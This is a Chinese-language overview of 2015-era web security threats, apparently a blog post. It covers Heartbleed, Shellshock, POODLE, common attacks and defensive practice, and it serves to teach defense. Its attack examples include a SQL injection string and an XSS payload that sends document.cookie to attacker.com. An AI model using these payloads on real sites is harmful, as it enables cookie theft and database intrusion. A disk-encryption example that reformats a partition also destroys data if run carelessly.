# 網路安全威脅趨勢

## 前言

2015 年的網路安全環境充滿挑戰，各種威脅持續演進。

---

## 重大漏洞事件

### Heartbleed (2014)

OpenSSL 心臟出血漏洞。

**影響：**
- 數百萬伺服器受影響
- 可能洩露敏感資料
- 記憶體內容洩露

**防護：**
```bash
# 檢查漏洞
testssl.sh vulnerable-site.com

# 更新 OpenSSL
sudo apt-get update && sudo apt-get upgrade openssl
```

### Shellshock (2014)

Bash 指令解釋器漏洞。

**影響：**
- 遠端程式碼執行
- Web 伺服器攻擊
- CGI 指令碼

**防護：**
```bash
# 檢查
env X="() { :; }; echo vulnerable" bash -c "echo test"

# 修補
sudo yum update bash
```

### POODLE (2014)

SSL 3.0 降級攻擊。

**防護：**
```nginx
# Nginx 停用 SSLv3
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
```

[搜尋 2015 security vulnerabilities](https://www.google.com/search?q=2015+security+vulnerabilities+summary)

---

## 常見攻擊類型

### 1. DDoS 攻擊

```bash
# 流量型
# 使用大量流量淹沒目標

# 應用層
# 針對特定端點發動請求
```

### 2. SQL 注入

```sql
-- 惡意輸入
' OR '1'='1' --

-- 防護：使用參數化查詢
```

### 3. XSS (跨站腳本)

```javascript
// 惡意腳本
<script>document.location='http://attacker.com?c='+document.cookie</script>

// 防護：輸入驗證、輸出編碼
```

### 4. 中間人攻擊 (MITM)

```
攻擊者 ──────> 受害者
     └───────> 伺服器
```

**防護：** 使用 HTTPS、憑證釘選

---

## 密碼安全

### 密碼雜湊

```python
# 錯誤：MD5
import hashlib
h = hashlib.md5(password.encode())  # 不安全

# 正確：bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# 正確：Argon2
from argon2 import PasswordHasher
ph = PasswordHasher()
hashed = ph.hash(password)
```

### 密碼政策

```bash
# 最小長度
# 大小寫混合
# 數字和特殊字元
# 禁止常見密碼
```

---

## 網路分段

### 隔離原則

```
辦公網路 ──> DMZ ──> 內部網路
    │          │          │
   網頁       應用       資料庫
  伺服器     伺服器     伺服器
```

### 防火牆規則

```bash
# 允許清單
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -j DROP

# 只允許必要的連接埠
```

---

## 監控與日誌

### SIEM (安全性資訊與事件管理)

| 工具 | 說明 |
|------|------|
| OSSEC | 開源主機入侵偵測 |
| ELK Stack | 日誌收集和分析 |
| Splunk | 企業級 SIEM |

### 日誌分析

```bash
# 異常登入
grep "Failed password" /var/log/auth.log

# 可疑流量
tcpdump -i eth0 | grep -i "sensitive"

# 連接埠掃描
netstat -an | grep SYN
```

---

## 零信任網路

### 概念

```
傳統：信任內網使用者

零信任：永不信任，始終驗證
```

### 實施

```bash
# 微分割
# 每次存取都驗證
# 最小權限原則
```

---

## 加密使用

### 傳輸加密

```bash
# HTTPS 強制
Header set Strict-Transport-Security "max-age=31536000"
```

### 靜態加密

```bash
# 磁碟加密
# LUKS (Linux)
cryptsetup luksFormat /dev/sda5

# 檔案加密
gpg -c sensitive.txt
```

---

## 小結

網路安全需要全面的防禦策略，從網路架構到應用程式都要考慮安全性。

---

*作者：AI 程式人團隊*

*延伸閱讀：*
- [OWASP Top 10](https://www.google.com/search?q=OWASP+Top+10+2015)
- [CVE 資料庫](https://www.google.com/search?q=CVE+database)